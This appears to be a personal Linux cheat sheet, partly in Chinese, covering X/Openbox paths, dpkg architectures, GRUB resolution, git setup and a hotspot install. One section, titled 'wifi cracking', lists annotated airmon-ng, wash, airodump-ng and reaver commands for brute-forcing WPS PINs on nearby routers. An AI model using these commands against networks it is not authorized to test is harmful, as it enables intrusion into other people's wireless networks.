
------------------------------------------------------------------------
####base-files
X-server		    xorg		/etc/X11/xorg.conf  
X-client  
window manager		openbox 	~/.config/openbox/  

####架构
dpkg --add-architecture i386  
dpkg --remove-architecture i386  
api libgl1-fglrx-glx:i386  

####tty 分辨率修改
vim /etc/default/grub  
GRUB_GFXPAYLOAD_LINUX=1920x1080  
update-grub  
api amd64-microcode  

####git 
    blob  版本文件
    tree  目录信息
    commit 更新描述
    tag    标签
    
    working directory       staging area        git directory
    ssh-keygen -t rsa -C "dsxyr0@163.com"
    ssh -T git@github.com
    
    git init
    git add xxx
    git commit -m "xxx"
    git config --global user.name "dsxyr"
    git config --global user.email "dsxyr0@163.com"
    git remote add symy https://github.com/dsxyr/symy.git
    git push -u symy master

####wifi破解
    ifconfig –a              //确认你用哪一个网卡WLAN0或WLAN1
    airmon-ng start wlan0     //开启监听模式
    wash –i mon0 –C         //查看开启wps的无线路由器
    airodump-ng mon0          //查看周边AP信息（抓包）
    reaver –i mon0 –b MAC –a –S –vv –d 3 –t 3  //开始穷举PIN码
    reaver –i mon0 –b MAC –a –S –vv –d 0        //加快速度为1秒
    reaver –i mon0 –b MAC –a –S –vv –p xxxx     //从前4位PIN码开始
    reave的进度表文件保存在:
        1.3版：/etc/reaver/MAC地址.wpc
        1.4版：/usr/local/etc/reaver/MAC地址.wpc



sudo add-apt-repository ppa:nilarimogard/webupd8
sudo apt-get update
sudo apt-get install ap-hotspot

